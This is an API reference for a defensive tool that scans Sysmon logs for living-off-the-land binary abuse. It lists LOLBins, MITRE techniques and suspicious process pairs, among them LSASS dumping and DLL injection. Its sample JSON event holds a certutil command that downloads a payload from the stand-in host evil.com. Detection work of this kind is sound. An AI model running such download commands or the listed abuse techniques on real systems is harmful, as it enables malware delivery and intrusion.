# API Reference: Detecting Living Off the Land Attacks

## CLI Usage

```bash
# Analyze Sysmon EVTX file
python agent.py sysmon-events.evtx

# Analyze Sysmon JSON/JSONL export (one event per line)
python agent.py sysmon-events.jsonl

# Filter output for critical alerts
python agent.py sysmon-events.evtx 2>/dev/null | grep CRITICAL
```

## LOLBins Detected

| Binary | MITRE Technique | Severity | Abuse Type |
|--------|----------------|----------|------------|
| certutil.exe | T1218, T1105, T1140 | high | Download, decode, encode |
| mshta.exe | T1218.005 | high | Remote/inline script execution |
| rundll32.exe | T1218.011 | critical | JS execution, LSASS dump, DLL loading |
| regsvr32.exe | T1218.010 | critical | Squiblydoo scriptlet execution |
| bitsadmin.exe | T1197, T1105 | high | BITS download, job notification |
| wmic.exe | T1047 | high | Remote process creation, XSL processing |
| msbuild.exe | T1127.001 | high | Inline task execution from temp/AppData |
| installutil.exe | T1218.004 | high | Silent uninstall execution |
| cmstp.exe | T1218.003 | high | INF-based execution |
| mavinject.exe | T1218.013 | critical | DLL injection into running process |
| cscript.exe | T1059.005 | medium | Remote/suspicious script execution |
| wscript.exe | T1059.005 | medium | Remote/suspicious script execution |

## Suspicious Parent-Child Pairs Detected

| Parent Process | Child Process | MITRE | Severity |
|---------------|--------------|-------|----------|
| winword/excel/outlook | cmd/powershell/mshta/certutil | T1204.002 | critical |
| wmiprvse.exe | cmd/powershell/mshta/rundll32 | T1047 | critical |
| services.exe | cmd/powershell/mshta/rundll32 | T1543.003 | high |
| svchost.exe | mshta/regsvr32/msbuild/certutil | T1218 | high |

## Network-Suspicious LOLBins

LOLBins making outbound network connections are flagged as CRITICAL:

certutil.exe, mshta.exe, rundll32.exe, regsvr32.exe, msbuild.exe,
installutil.exe, bitsadmin.exe, esentutl.exe, expand.exe, replace.exe, cmstp.exe

## Input Formats

### JSON Events Format

```json
[
  {
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil -urlcache -f http://evil.com/payload.exe C:\\temp\\p.exe",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "User": "CORP\\jsmith",
    "UtcTime": "2026-03-19 14:32:15.000",
    "Computer": "WORKSTATION-01"
  }
]
```

### EVTX Requirements

Sysmon EVTX files with:
- Event ID 1 (Process Creation) with full command-line logging
- Event ID 3 (Network Connection) for LOLBin network detection

## Report Output Schema

```json
{
  "report_date": "2026-03-19T12:00:00+00:00",
  "total_findings": 15,
  "by_severity": {"critical": 3, "high": 8, "medium": 4},
  "by_lolbin": {"certutil.exe": 5, "rundll32.exe": 3, "mshta.exe": 2},
  "mitre_techniques_observed": ["T1047", "T1105", "T1218", "T1218.005", "T1218.011"],
  "findings": []
}
```

## References

- LOLBAS Project: https://lolbas-project.github.io/
- MITRE ATT&CK Defense Evasion: https://attack.mitre.org/tactics/TA0005/
- Sysmon Documentation: https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
- Sigma LOLBin Rules: https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation
